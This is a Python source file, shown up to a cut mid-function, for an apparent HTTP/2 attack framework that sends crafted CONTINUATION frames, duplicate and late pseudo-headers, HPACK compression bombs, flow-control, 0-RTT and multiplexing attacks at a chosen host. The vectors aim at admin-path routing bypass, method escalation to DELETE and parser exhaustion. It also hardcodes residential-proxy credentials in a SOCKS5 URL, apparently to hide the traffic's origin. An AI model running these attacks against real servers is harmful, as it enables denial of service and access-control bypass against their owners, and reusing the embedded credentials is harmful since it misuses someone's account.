#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTTP/2 CONTINUATION
"""

import asyncio
import struct
import socket
import ssl
import time
import json
import logging
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from enum import IntEnum
from concurrent.futures import ThreadPoolExecutor
import hashlib
import random
import sys
import psutil
import gc

# Windows兼容性处理
try:
    import resource
    RESOURCE_AVAILABLE = True
except ImportError:
    RESOURCE_AVAILABLE = False

try:
    import hpack
except ImportError:
    print("Error: hpack library not found. Install with: pip install hpack")
    sys.exit(1)

# IP池支持
try:
    from python_socks.async_.asyncio import Proxy
    from python_socks import ProxyType
    PROXY_AVAILABLE = True
except ImportError:
    PROXY_AVAILABLE = False

# 代理配置
PROXY_ENABLED = False
PROXY_URL = "socks5://novada296TteLUNz_K0fuUk-zone-resi-region-vn-asn-AS7552:Hx3ZWOhIon5t@0c05ed992a26c3f0.lsv.as.novada.pro:7777"

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class FrameType(IntEnum):
    """HTTP/2 frame types"""
    DATA = 0x0
    HEADERS = 0x1
    PRIORITY = 0x2
    RST_STREAM = 0x3
    SETTINGS = 0x4
    PUSH_PROMISE = 0x5
    PING = 0x6
    GOAWAY = 0x7
    WINDOW_UPDATE = 0x8
    CONTINUATION = 0x9

class FrameFlag(IntEnum):
    """HTTP/2 frame flags"""
    END_STREAM = 0x1
    END_HEADERS = 0x4
    PADDED = 0x8
    PRIORITY = 0x20

class SettingsParameter(IntEnum):
    """HTTP/2 settings parameters"""
    HEADER_TABLE_SIZE = 0x1
    ENABLE_PUSH = 0x2
    MAX_CONCURRENT_STREAMS = 0x3
    INITIAL_WINDOW_SIZE = 0x4
    MAX_FRAME_SIZE = 0x5
    MAX_HEADER_LIST_SIZE = 0x6

class H2ErrorCode(IntEnum):
    """HTTP/2 error codes"""
    NO_ERROR = 0x0
    PROTOCOL_ERROR = 0x1
    INTERNAL_ERROR = 0x2
    FLOW_CONTROL_ERROR = 0x3
    SETTINGS_TIMEOUT = 0x4
    STREAM_CLOSED = 0x5
    FRAME_SIZE_ERROR = 0x6
    REFUSED_STREAM = 0x7
    CANCEL = 0x8
    COMPRESSION_ERROR = 0x9
    CONNECT_ERROR = 0xa
    ENHANCE_YOUR_CALM = 0xb
    INADEQUATE_SECURITY = 0xc
    HTTP_1_1_REQUIRED = 0xd

@dataclass
class H2Frame:
    """HTTP/2 frame structure"""
    length: int
    frame_type: FrameType
    flags: int
    stream_id: int
    payload: bytes
    
    def __bytes__(self) -> bytes:
        """Convert frame to bytes"""
        header = struct.pack('>I', self.length)[1:]  # 3-byte length
        header += struct.pack('>BB', self.frame_type, self.flags)
        header += struct.pack('>I', self.stream_id & 0x7FFFFFFF)
        return header + self.payload

@dataclass
class AttackResult:
    """Structured attack result"""
    name: str
    success: bool
    vulnerability_detected: bool
    response_status: Optional[int] = None
    response_headers: Dict[str, str] = None
    evidence: List[str] = None
    error: Optional[str] = None
    processing_time_ms: float = 0.0
    
    def __post_init__(self):
        if self.response_headers is None:
            self.response_headers = {}
        if self.evidence is None:
            self.evidence = []

class H2ContinuationConfusion:
    """
    Advanced HTTP/2 CONTINUATION frame confusion attack framework
    
    NOTE: This module retains some frame-level HTTP/2 implementation for specialized
    CONTINUATION frame attacks that require precise frame boundary control.
    For general HTTP/2 connectivity, it now uses httpx-based implementations.
    """
    
    CONNECTION_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    MAX_CONCURRENT_ATTACKS = 10
    DEFAULT_FRAME_SIZE = 16384
    MAX_MEMORY_MB = 512  # Maximum memory usage limit in MB
    HPACK_TABLE_SIZE_LIMIT = 65536  # 64KB HPACK table limit
    MAX_CONTINUATION_BUFFER_SIZE = 1048576  # 1MB max continuation buffer
    
    def __init__(self, target_host: str, target_port: int = 443, 
                 timeout: float = 10.0, max_retries: int = 3,
                 memory_limit_mb: int = 512, fingerprint_data: Dict = None,
                 cert_data: Dict = None, debug: bool = False):
        """Initialize the attack framework with optional integration data"""
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.max_retries = max_retries
        self.memory_limit_mb = memory_limit_mb
        self.debug = debug
        self.encoder = hpack.Encoder()
        self.decoder = hpack.Decoder()
        self.stream_id_counter = 1
        self.attack_results = []
        self.server_settings = {}
        self.connection_state = {}
        self.baseline_memory = self._get_memory_usage()
        
        # Advanced attack state tracking
        self.tls_version = None
        self.supports_0rtt = False
        self.server_push_enabled = False
        
        # Integration with other tools
        self.fingerprint_data = fingerprint_data or {}
        self.cert_data = cert_data or {}
        self.integration_enabled = bool(fingerprint_data or cert_data)
        
        # Connection pool and concurrency management
        self.connection_pool = []
        self.active_connections = 0
        self.max_pool_size = 5
        
        # Attack-specific timeout configuration
        self.attack_timeouts = {
            'default': timeout,
            'hpack_compression_bomb': timeout * 3,  # Longer timeout for compression tests
            'flow_control_attacks': timeout * 2,
            'multiplex_confusion': timeout * 2,
            'frame_boundaries': timeout * 1.5
        }
        
        # Attack statistics tracking
        self.attack_stats = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'vulnerabilities_found': 0,
            'false_positives': 0  # Can be manually adjusted based on validation
        }
        
    async def run_all_attacks(self) -> Dict[str, Any]:
        """Execute comprehensive HTTP/2 vulnerability assessment"""
        logger.info(f"Starting HTTP/2 CONTINUATION confusion attacks against {self.target_host}:{self.target_port}")
        
        start_time = time.time()
        results = {
            'target': f"{self.target_host}:{self.target_port}",
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'attacks': {},
            'vulnerabilities': [],
            'metadata': {
                'tool_version': '2.0',
                'attack_duration': 0,
                'total_requests': 0
            }
        }
        
        # Apply external intelligence if available
        intelligence = {}
        if self.integration_enabled:
            logger.info("Applying external intelligence for enhanced attacks...")
            intelligence = self.integrate_external_intelligence()
            results['intelligence'] = intelligence
        
        # Test basic HTTP/2 connectivity first
        logger.info("Testing basic HTTP/2 connectivity...")
        connectivity_result = await self.test_h2_connectivity()
        results['connectivity'] = connectivity_result
        
        if not connectivity_result['supported']:
            logger.error("Target does not support HTTP/2 - providing diagnostic report")
            results['metadata']['attack_duration'] = time.time() - start_time
            
            # Enhanced summary with diagnostic information
            results['summary'] = {
                'total_attacks': 0,
                'vulnerabilities_found': 0,
                'critical_count': 0,
                'high_count': 0,
                'medium_count': 0,
                'low_count': 0,
                'highest_severity': 'NONE',
                'overall_risk': 'NONE',
                'error': connectivity_result.get('error', 'HTTP/2 not supported'),
                'error_type': connectivity_result.get('error_type', 'ConnectionError'),
                'diagnostics': connectivity_result.get('diagnostics', {}),
                'recommendations': connectivity_result.get('recommendations', [])
            }
            
            # Print detailed diagnostic information
            print(f"\n DIAGNOSTIC INFORMATION:")
            if 'diagnostics' in connectivity_result:
                diag = connectivity_result['diagnostics']
                if diag.get('ssl_handshake'):
                    print(f"    SSL Handshake: Successful")
                    print(f"    TLS Version: {diag.get('tls_version', 'Unknown')}")
                    print(f"    Cipher Suite: {diag.get('cipher_suite', 'Unknown')}")
                    print(f"    ALPN Selected: {diag.get('alpn_selected', 'None')}")
                else:
                    print(f"    SSL Handshake: Failed")
                print(f"    Connection Attempts: {diag.get('connection_attempts', 0)}")
            
            if 'recommendations' in connectivity_result and connectivity_result['recommendations']:
                print(f"\n RECOMMENDATIONS:")
                for i, rec in enumerate(connectivity_result['recommendations'], 1):
                    print(f"   {i}. {rec}")
                    
            return results
        
        # Execute attack vectors including new advanced attacks
        attack_methods = [
            ('pseudo_header_priority', self.test_pseudo_header_priority),
            ('authority_confusion', self.test_authority_confusion),
            ('duplicate_pseudo_headers', self.test_duplicate_pseudo_headers),
            ('header_interleaving', self.test_header_interleaving),
            ('frame_boundaries', self.test_frame_size_boundaries),
            ('routing_confusion', self.test_routing_confusion),
            ('hpack_compression_bomb', self.test_hpack_compression_attacks),
            ('flow_control_manipulation', self.test_flow_control_attacks),
            ('priority_manipulation', self.test_priority_attacks),
            ('stream_state_confusion', self.test_stream_state_attacks),
            ('early_data_injection', self.test_early_data_injection),
            ('multiplex_confusion', self.test_multiplex_confusion),
            ('settings_race_condition', self.test_settings_race_conditions),
            ('push_promise_confusion', self.test_push_promise_confusion)
        ]
        
        # Filter and prioritize attacks based on intelligence
        if intelligence.get('combined_strategy', {}).get('high_priority_attacks'):
            priority_attacks = intelligence['combined_strategy']['high_priority_attacks']
            logger.info(f"Prioritizing attacks based on intelligence: {priority_attacks}")
            # Reorder attack methods to prioritize intelligence-suggested attacks
            prioritized_methods = []
            remaining_methods = []
            
            for attack_name, attack_method in attack_methods:
                if attack_name in priority_attacks:
                    prioritized_methods.append((attack_name, attack_method))
                else:
                    remaining_methods.append((attack_name, attack_method))
            
            attack_methods = prioritized_methods + remaining_methods
        
        # Run attacks with concurrent execution where safe
        for attack_name, attack_method in attack_methods:
            logger.info(f"Executing attack: {attack_name}")
            try:
                # Apply server-specific optimizations if available
                if intelligence.get('combined_strategy', {}).get('optimizations'):
                    optimizations = intelligence['combined_strategy']['optimizations']
                    self._apply_attack_optimizations(optimizations)
                
                attack_result = await attack_method()
                results['attacks'][attack_name] = attack_result
                results['metadata']['total_requests'] += attack_result.get('requests_made', 0)
                
                # Update statistics
                self.attack_stats['total_attacks'] += 1
                if attack_result.get('success', False):
                    self.attack_stats['successful_attacks'] += 1
                else:
                    self.attack_stats['failed_attacks'] += 1
                
                if attack_result.get('vulnerable', False) or attack_result.get('bypasses_found', 0) > 0:
                    self.attack_stats['vulnerabilities_found'] += 1
                
                # Memory check after each attack
                if not self._check_memory_limit():
                    logger.warning("Memory limit reached, performing garbage collection")
                    self._force_garbage_collection()
                    
            except Exception as e:
                logger.error(f"Attack {attack_name} failed: {e}")
                results['attacks'][attack_name] = {
                    'error': str(e),
                    'success': False
                }
        
        # Analyze results and generate vulnerability report
        results['metadata']['attack_duration'] = time.time() - start_time
        self._analyze_results(results)
        
        # Add attack statistics to results
        results['statistics'] = self.attack_stats.copy()
        if self.attack_stats['total_attacks'] > 0:
            results['statistics']['success_rate'] = (
                self.attack_stats['successful_attacks'] / self.attack_stats['total_attacks'] * 100
            )
            results['statistics']['vulnerability_rate'] = (
                self.attack_stats['vulnerabilities_found'] / self.attack_stats['total_attacks'] * 100
            )
        
        if self.debug:
            logger.info(f"Attack statistics: {results['statistics']}")
        
        # Clean up connection pool
        await self._cleanup_connection_pool()
        
        return results
    
    async def _cleanup_connection_pool(self):
        """Clean up all connections in the pool"""
        logger.debug(f"Cleaning up connection pool with {len(self.connection_pool)} connections")
        
        while self.connection_pool:
            try:
                reader, writer = self.connection_pool.pop()
                await self._cleanup_connection(reader, writer)
            except Exception as e:
                logger.debug(f"Error cleaning up pooled connection: {e}")
        
        self.active_connections = 0
        logger.debug("Connection pool cleanup completed")
    
    async def test_h2_connectivity(self) -> Dict[str, Any]:
        """Test basic HTTP/2 connectivity using shared protocol client"""
        # 🔄 SYSTEM REFACTORING: Use shared httpx-based client instead of hand-written HTTP/2
        try:
            from .shared_protocol_client import get_shared_client
            
            client = get_shared_client(self.target_host, self.target_port, timeout=self.timeout)
            result = await client.test_http2_connectivity()
            
            logger.info(f"HTTP/2 connectivity test via shared client: {'SUCCESS' if result.get('supported') else 'FAILED'}")
            
            return result
            
        except ImportError:
            logger.warning("Shared protocol client not available, using httpx-based HTTP/2 implementation")
            return await self._httpx_test_h2_connectivity()
    
    async def _httpx_test_h2_connectivity(self) -> Dict[str, Any]:
        """Modern httpx-based HTTP/2 connectivity test"""
        import httpx
        
        diagnostic_info = {
            'ssl_handshake': False,
            'alpn_offered': ['h2', 'http/1.1'],
            'alpn_selected': None,
            'tls_version': None,
            'cipher_suite': None,
            'connection_attempts': 1,
            'httpx_implementation': True
        }
        
        try:
            timeout = httpx.Timeout(self.timeout)
            async with httpx.AsyncClient(
                timeout=timeout,
                verify=False,
                http2=True,
                limits=httpx.Limits(max_keepalive_connections=5)
            ) as client:
                start_time = time.perf_counter()
                url = f"https://{self.target_host}:{self.target_port}/"
                
                response = await client.get(url)
                rtt_ms = (time.perf_counter() - start_time) * 1000
                
                # Extract protocol information
                diagnostic_info.update({
                    'ssl_handshake': True,
                    'alpn_selected': 'h2' if response.http_version == 'HTTP/2' else 'http/1.1',
                    'connection_attempts': 1
                })
                
                return {
                    'h2_supported': response.http_version == 'HTTP/2',
                    'status_code': response.status_code,
                    'response_time_ms': rtt_ms,
                    'diagnostic': diagnostic_info,
                    'error': None
                }
                
        except Exception as e:
            error_type = type(e).__name__
            error_message = str(e)
            
            logger.warning(f"HTTP/2 connectivity test failed [{error_type}]: {error_message}")
            
            return {
                'h2_supported': False,
                'status_code': 0,
                'response_time_ms': 0.0,
                'diagnostic': diagnostic_info,
                'error': f"{error_type}: {error_message}",
                'recommendations': [
                    'Server may not support HTTP/2 or HTTPS',
                    'Check server configuration and certificate validity',
                    'Verify network connectivity to target'
                ]
            }

    
    async def perform_http1_reconnaissance(self) -> Dict[str, Any]:
        """Perform basic HTTP/1.1 reconnaissance when HTTP/2 is not supported"""
        try:
            # Prepare HTTP/1.1 request
            request = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nUser-Agent: Mozilla/5.0 (Security Scanner)\r\nConnection: close\r\n\r\n"
            
            # Establish HTTP/1.1 connection
            context = ssl.create_default_context()
            context.check_hostname = False  
            context.verify_mode = ssl.CERT_NONE
            context.set_alpn_protocols(['http/1.1'])
            
            reader, writer = await asyncio.open_connection(
                self.target_host, self.target_port, 
                ssl=context, server_hostname=self.target_host
            )
            
            # Send HTTP/1.1 request
            writer.write(request.encode())
            await writer.drain()
            
            # Read response with timeout
            response_data = await asyncio.wait_for(reader.read(8192), timeout=10.0)
            response_text = response_data.decode('utf-8', errors='ignore')
            
            # Close connection
            writer.close()
            await writer.wait_closed()
            
            # Parse response
            lines = response_text.split('\r\n')
            status_line = lines[0] if lines else ''
            
            response_headers = {}
            header_section = True
            body_start_index = 0
            
            for i, line in enumerate(lines[1:], 1):
                if not line and header_section:
                    header_section = False
                    body_start_index = i + 1
                    break
                elif header_section and ':' in line:
                    key, value = line.split(':', 1)
                    response_headers[key.lower().strip()] = value.strip()
            
            return {
                'success': True,
                'status_line': status_line,
                'response_headers': response_headers,
                'server_header': response_headers.get('server', 'Unknown'),
                'content_length': len(response_text),
                'has_security_headers': any(h in response_headers for h in 
                    ['strict-transport-security', 'content-security-policy', 'x-frame-options']),
                'recommendations': [
                    'Target responds to HTTP/1.1 requests',
                    'Consider using HTTP/1.1 security testing tools like Burp Suite or OWASP ZAP',
                    'Test for common web vulnerabilities (XSS, SQLi, CSRF)',
                    'Check for directory enumeration and file inclusion vulnerabilities'
                ]
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'error_type': type(e).__name__,
                'recommendations': [
                    'HTTP/1.1 connection also failed',
                    'Target may be completely unreachable or have strict firewall rules',
                    'Verify target hostname and port are correct',
                    'Consider network-level reconnaissance tools'
                ]
            }
    
    async def test_pseudo_header_priority(self) -> Dict[str, Any]:
        """Test pseudo-header priority confusion vulnerabilities"""
        attacks = []
        
        attack_vectors = [
            {
                'name': 'authority_in_continuation',
                'description': ':authority pseudo-header placed in CONTINUATION frame',
                'headers_frame': [
                    (':method', 'GET'),
                    (':scheme', 'https'),
                    (':path', '/admin')
                ],
                'continuation_frame': [
                    (':authority', self.target_host),
                    ('host', 'evil.attacker.com'),
                    ('x-forwarded-host', 'internal.admin')
                ]
            },
            {
                'name': 'multiple_authorities',
                'description': 'Multiple :authority headers across frames',
                'headers_frame': [
                    (':method', 'GET'),
                    (':authority', 'public.example.com'),
                    (':scheme', 'https'),
                    (':path', '/api/public')
                ],
                'continuation_frame': [
                    (':authority', 'admin.internal'),
                    ('authorization', 'Bearer admin-token-123'),
                    ('x-admin-bypass', 'true')
                ]
            },
            {
                'name': 'late_method_override',
                'description': 'HTTP method override via late pseudo-header',
                'headers_frame': [
                    (':method', 'GET'),
                    (':scheme', 'https'),
                    (':authority', self.target_host),
                    (':path', '/api/users')
                ],
                'continuation_frame': [
                    (':method', 'DELETE'),  # Late method override
                    ('x-http-method-override', 'DELETE'),
                    ('content-length', '0')
                ]
            }
        ]
        
        for vector in attack_vectors:
            result = await self._execute_continuation_attack(vector)
            attacks.append(result)
        
        return {
            'attacks_performed': len(attacks),
            'results': attacks,
            'vulnerable': any(a.vulnerability_detected for a in attacks),
            'requests_made': len(attacks)
        }
    
    async def test_authority_confusion(self) -> Dict[str, Any]:
        """Test cross-CONTINUATION :authority manipulation"""
        attacks = []
        
        confusion_scenarios = [
            {
                'name': 'late_authority_override',
                'description': 'Late :authority overrides early one for routing bypass',
                'headers': [
                    (':method', 'GET'),
                    (':scheme', 'https'),
                    (':authority', 'public.example.com'),
                    (':path', '/public/info')
                ],
                'continuation': [
                    (':authority', 'admin.internal'),
                    ('x-internal-access', 'true'),
                    ('x-bypass-auth', 'admin')
                ]
            },
            {
                'name': 'authority_host_mismatch',
                'description': ':authority and Host header mismatch for confusion',
                'headers': [
                    (':method', 'POST'),
                    (':scheme', 'https'),
                    (':authority', self.target_host),
                    (':path', '/api/admin/users'),
                    ('host', 'api.public.com')
                ],
                'continuation': [
                    ('host', 'admin.internal'),
                    ('content-type', 'application/json'),
                    ('x-real-ip', '127.0.0.1')
                ]
            },
            {
                'name': 'subdomain_confusion',
                'description': 'Subdomain authority confusion attack',
                'headers': [
                    (':method', 'GET'),
                    (':scheme', 'https'),
                    (':authority', f"api.{self.target_host}"),
                    (':path', '/v1/public')
                ],
                'continuation': [
                    (':authority', f"admin.{self.target_host}"),
                    ('cookie', 'session=admin_session_token'),
                    ('x-forwarded-proto', 'https')
                ]
            }
        ]
        
        for scenario in confusion_scenarios:
            result = await self._test_authority_scenario(scenario)
            attacks.append(result)
        
        return {
            'scenarios_tested': len(attacks),
            'results': attacks,
            'authority_confusion_detected': any(a.get('confusion_detected') for a in attacks),
            'requests_made': len(attacks)
        }
    
    async def test_duplicate_pseudo_headers(self) -> Dict[str, Any]:
        """Test duplicate pseudo-header injection attacks"""
        attacks = []
        
        duplicate_scenarios = [
            {
                'name': 'duplicate_path_escalation',
                'headers_1': [
                    (':method', 'GET'), 
                    (':scheme', 'https'), 
                    (':authority', self.target_host), 
                    (':path', '/public')
                ],
                'headers_2': [
                    (':path', '/admin/dashboard'),
                    ('cookie', 'admin_session=true'),
                    ('x-requested-with', 'XMLHttpRequest')
                ]
            },
            {
                'name': 'duplicate_method_privilege',
                'headers_1': [
                    (':method', 'GET'), 
                    (':scheme', 'https'), 
                    (':authority', self.target_host), 
                    (':path', '/api/users/1')
                ],
                'headers_2': [
                    (':method', 'DELETE'),
                    ('authorization', 'Bearer admin-token'),
                    ('x-csrf-token', 'bypass')
                ]
            },
            {
                'name': 'duplicate_scheme_downgrade',
                'headers_1': [
                    (':method', 'POST'), 
                    (':scheme', 'https'), 
                    (':authority', self.target_host), 
                    (':path', '/api/sensitive')
                ],
                'headers_2': [
                    (':scheme', 'http'),  # Potential downgrade
                    ('content-type', 'application/json'),
                    ('x-forwarded-proto', 'http')
                ]
            }
        ]
        
        for scenario in duplicate_scenarios:
            result = await self._test_duplicate_scenario(scenario)
            attacks.append(result)
        
        return {
            'scenarios_tested': len(attacks),
            'results': attacks,
            'duplicate_headers_accepted': sum(1 for a in attacks if a.get('accepted')),
            'requests_made': len(attacks)
        }
    
    async def test_header_interleaving(self) -> Dict[str, Any]:
        """Test pseudo-header and regular header interleaving violations"""
        attacks = []
        
        interleave_patterns = [
            {
                'name': 'pseudo_after_regular_critical',
                'description': 'Critical pseudo-headers after regular headers',
                'sequence': [
                    (':method', 'GET'),
                    (':scheme', 'https'),
                    ('authorization', 'Bearer public-token'),
                    (':authority', 'admin.internal'),  # Late authority
                    ('cookie', 'admin=true'),
                    (':path', '/admin/sensitive')  # Late path
                ]
            },
            {
                'name': 'alternating_privilege_escalation',
                'description': 'Alternating headers for privilege escalation',
                'sequence': [
                    (':method', 'POST'),
                    ('content-type', 'application/json'),
                    (':scheme', 'https'),
                    ('authorization', 'Bearer admin-token'),
                    (':authority', 'admin.internal'),
                    ('x-admin-override', 'true'),
                    (':path', '/api/admin/create-user')
                ]
            },
            {
                'name': 'mixed_security_context',
                'description': 'Mixed security context via interleaving',
                'sequence': [
                    (':method', 'DELETE'),
                    ('user-agent', 'PublicClient/1.0'),
                    (':scheme', 'https'),
                    ('x-forwarded-for', '127.0.0.1'),
                    (':authority', self.target_host),
                    ('x-real-ip', '10.0.0.1'),
                    (':path', '/api/admin/delete-all')
                ]
            }
        ]
        
        for pattern in interleave_patterns:
            result = await self._test_interleave_pattern(pattern)
            attacks.append(result)
        
        return {
            'patterns_tested': len(attacks),
            'results': attacks,
            'violations_accepted': sum(1 for a in attacks if a.get('violation_accepted')),
            'requests_made': len(attacks)
        }
    
    async def test_frame_size_boundaries(self) -> Dict[str, Any]:
        """Test CONTINUATION frame size boundary processing"""
        attacks = []
        
        boundary_tests = [
            {
                'name': 'micro_frames_exhaustion',
                'description': 'Exhaust parser with micro CONTINUATION frames',
                'frame_sizes': [1] * 100  # 100 single-byte frames
            },
            {
                'name': 'large_then_tiny',
                'description': 'Large initial frame followed by tiny continuations',
                'frame_sizes': [self.DEFAULT_FRAME_SIZE, 1, 1, 1]
            },
            {
                'name': 'exponential_growth',
                'description': 'Exponentially growing frame sizes',
                'frame_sizes': [2**i for i in range(1, 8)]  # 2, 4, 8, 16, 32, 64, 128
            },
            {
                'name': 'sawtooth_pattern',
                'description': 'Sawtooth frame size pattern',
                'frame_sizes': [1, 1000, 1, 1000, 1, 1000]
            }
        ]
        
        for test in boundary_tests:
            result = await self._test_frame_boundaries(test)
            attacks.append(result)
        
        return {
            'boundary_tests': len(attacks),
            'results': attacks,
            'processing_anomalies': sum(1 for a in attacks if a.get('anomaly_detected')),
            'requests_made': len(attacks)
        }
    
    async def test_routing_confusion(self) -> Dict[str, Any]:
        """Test request routing confusion via header splitting"""
        attacks = []
        
        routing_attacks = [
            {
                'name': 'admin_path_injection',
                'target_path': '/public/info',
                'injected_path': '/admin/dashboard',
                'description': 'Inject admin path via CONTINUATION'
            },
            {
                'name': 'api_endpoint_confusion',
                'target_path': '/api/v1/public/users',
                'injected_path': '/api/v1/admin/users',
                'description': 'API endpoint privilege escalation'
            },
            {
                'name': 'host_routing_bypass',
                'target_host': f'public.{self.target_host}',
                'injected_host': f'admin.{self.target_host}',
                'description': 'Bypass host-based routing restrictions'
            },
            {
                'name': 'internal_service_access',
                'target_host': self.target_host,
                'injected_host': 'internal.service',
                'description': 'Access internal services via host confusion'
            },
            {
                'name': 'method_privilege_escalation',
                'target_method': 'GET',
                'injected_method': 'DELETE',
                'description': 'Escalate from read to delete privileges'
            }
        ]
        
        for attack in routing_attacks:
            result = await self._test_routing_attack(attack)
            attacks.append(result)
        
        return {
            'routing_attacks': len(attacks),
            'results': attacks,
            'bypasses_found': sum(1 for a in attacks if a.get('bypass_successful')),
            'requests_made': len(attacks)
        }
    
    async def test_hpack_compression_attacks(self) -> Dict[str, Any]:
        """Test HPACK compression-based attacks"""
        attacks = []
        
        # HPACK table poisoning
        poison_result = await self._test_hpack_table_poisoning()
        attacks.append(poison_result)
        
        # HPACK compression bomb
        bomb_result = await self._test_hpack_compression_bomb()
        attacks.append(bomb_result)
        
        # HPACK state confusion
        confusion_result = await self._test_hpack_state_confusion()
        attacks.append(confusion_result)
        
        return {
            'hpack_attacks': len(attacks),
            'results': attacks,
            'compression_vulnerabilities': sum(1 for a in attacks if a.vulnerability_detected),
            'requests_made': len(attacks)
        }
    
    async def test_flow_control_attacks(self) -> Dict[str, Any]:
        """Test flow control manipulation attacks"""
        attacks = []
        
        # Window exhaustion attack
        window_result = await self._test_window_exhaustion()
        attacks.append(window_result)
        
        # Flow control bypass
        bypass_result = await self._test_flow_control_bypass()
        attacks.append(bypass_result)
        
        return {
            'flow_control_attacks': len(attacks),
            'results': attacks,
            'flow_control_issues': sum(1 for a in attacks if a.vulnerability_detected),
            'requests_made': len(attacks)
        }
    
    async def test_priority_attacks(self) -> Dict[str, Any]:
        """Test HTTP/2 priority manipulation attacks"""
        attacks = []
        
        # Priority inversion attack
        inversion_result = await self._test_priority_inversion()
        attacks.append(inversion_result)
        
        return {
            'priority_attacks': len(attacks),
            'results': attacks,
            'priority_issues': sum(1 for a in attacks if a.vulnerability_detected),
            'requests_made': len(attacks)
        }
    
    async def test_stream_state_attacks(self) -> Dict[str, Any]:
        """Test stream state confusion attacks"""
        attacks = []
        
        # Stream state confusion
        state_result = await self._test_stream_state_confusion()
        attacks.append(state_result)
        
        return {
            'stream_state_attacks': len(attacks),
            'results': attacks,
            'state_issues': sum(1 for a in attacks if a.vulnerability_detected),
            'requests_made': len(attacks)
        }
    
    async def test_early_data_injection(self) -> Dict[str, Any]:
        """Test 0-RTT Early Data injection attacks for TLS 1.3"""
        attacks = []
        
        early_data_scenarios = [
            {
                'name': 'early_data_authority_confusion',
                'description': 'Inject malicious authority in TLS 1.3 0-RTT early data',
                'early_headers': [
                    (':method', 'GET'),
                    (':scheme', 'https'),
                    (':authority', 'admin.internal'),
                    (':path', '/admin/early-access')
                ],
                'normal_headers': [
                    (':authority', self.target_host),
                    ('authorization', 'Bearer public-token'),
                    ('x-forwarded-for', '127.0.0.1')
                ]
            },
            {
                'name': 'early_data_method_escalation',
                'description': 'Method escalation via early data injection',
                'early_headers': [
                    (':method', 'DELETE'),
                    (':scheme', 'https'),
                    (':authority', self.target_host),
                    (':path', '/api/admin/delete-all')
                ],
                'normal_headers': [
                    (':method', 'GET'),
                    ('user-agent', 'SafeClient/1.0'),
                    ('accept', 'application/json')
                ]
            }
        ]
        
        for scenario in early_data_scenarios:
            result = await self._test_early_data_scenario(scenario)
            attacks.append(result)
        
        return {
            'early_data_attacks': len(attacks),
            'results': attacks,
            'early_data_vulnerabilities': sum(1 for a in attacks if a.vulnerability_detected),
            'requests_made': len(attacks)
        }
    
    async def test_multiplex_confusion(self) -> Dict[str, Any]:
        """Test multi-stream multiplexing confusion attacks"""
        attacks = []
        
        multiplex_scenarios = [
            {
                'name': 'interleaved_continuation_confusion',
                'description': 'Interleave CONTINUATION frames from different streams',
                'stream_count': 3
            },
            {
                'name': 'rapid_stream_switching',
                'description': 'Rapidly switch between streams during header transmission',
                'stream_count': 5
            },
            {
                'name': 'continuation_hijacking',
                'description': 'Send CONTINUATION frame for different stream mid-transmission',
                'stream_count': 2
            }
        ]
        
        for scenario in multiplex_scenarios:
            result = await self._test_multiplex_scenario(scenario)
            attacks.append(result)
        
        return {
            'multiplex_attacks': len(attacks),
            'results': attacks,
            'multiplex_vulnerabilities': sum(1 for a in attacks if a.vulnerability_detected),
            'requests_made': len(attacks) * 3  # Multiple streams per attack
        }
    
    async def test_settings_race_conditions(self) -> Dict[str, Any]:
        """Test SETTINGS frame race condition attacks"""
        attacks = []
        
        race_scenarios = [
            {
                'name': 'settings_during_continuation',
                'description': 'Send SETTINGS frame during CONTINUATION sequence',
                'settings_timing': 'mid_continuation'
            },
            {
                'name': 'multiple_settings_race',
                'description': 'Send multiple conflicting SETTINGS rapidly',
                'settings_timing': 'rapid_multiple'
            },
            {
                'name': 'settings_table_size_race',
                'description': 'Race condition on HPACK table size changes',
                'settings_timing': 'table_size_change'
            }
        ]
        
        for scenario in race_scenarios:
            result = await self._test_settings_race_scenario(scenario)
            attacks.append(result)
        
        return {
            'settings_race_attacks': len(attacks),
            'results': attacks,
            'race_vulnerabilities': sum(1 for a in attacks if a.vulnerability_detected),
            'requests_made': len(attacks)
        }
    
    async def test_push_promise_confusion(self) -> Dict[str, Any]:
        """Test PUSH_PROMISE confusion attacks"""
        attacks = []
        
        push_scenarios = [
            {
                'name': 'push_promise_authority_override',
                'description': 'Override authority via PUSH_PROMISE continuation',
                'promised_path': '/admin/dashboard',
                'original_path': '/public/index'
            },
            {
                'name': 'push_promise_header_injection',
                'description': 'Inject malicious headers via PUSH_PROMISE',
                'promised_path': '/api/sensitive',
                'original_path': '/api/public'
            }
        ]
        
        for scenario in push_scenarios:
            result = await self._test_push_promise_scenario(scenario)
            attacks.append(result)
        
        return {
            'push_promise_attacks': len(attacks),
            'results': attacks,
            'push_vulnerabilities': sum(1 for a in attacks if a.vulnerability_detected),
            'requests_made': len(attacks)
        }
    
    def _get_memory_usage(self) -> float:
        """Get current memory usage in MB with enhanced Windows support"""
        try:
            process = psutil.Process()
            # 尝试获取内存信息
            mem_info = process.memory_info()
            
            # Windows特定处理
            if sys.platform == 'win32':
                # Windows上使用私有工作集作为内存使用指标
                if hasattr(mem_info, 'private'):
                    return mem_info.private / 1024 / 1024
                # 回退到RSS
                return mem_info.rss / 1024 / 1024
            else:
                # Unix系统使用RSS
                return mem_info.rss / 1024 / 1024
                
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
            if self.debug:
                logger.debug(f"Process-related memory measurement error: {e}")
            return 0.0
        except AttributeError as e:
            if self.debug:
                logger.debug(f"Memory attribute not available: {e}")
            return 0.0
        except OSError as e:
            # Windows特定的权限或系统错误
            if self.debug:
                logger.debug(f"OS error measuring memory (common on Windows): {e}")
            return 0.0
        except Exception as e:
            if self.debug:
                logger.warning(f"Unexpected error measuring memory usage: {e}")
            return 0.0
    
    def _check_memory_limit(self) -> bool:
        """Check if memory usage exceeds limit"""
        current_memory = self._get_memory_usage()
        if current_memory == 0.0:
            # 如果无法获取内存信息，不要中断测试
            return True
            
        memory_increase = current_memory - self.baseline_memory
        
        # 更宽松的内存限制，避免误报
        if memory_increase > self.memory_limit_mb * 1.5:  # 150% of limit
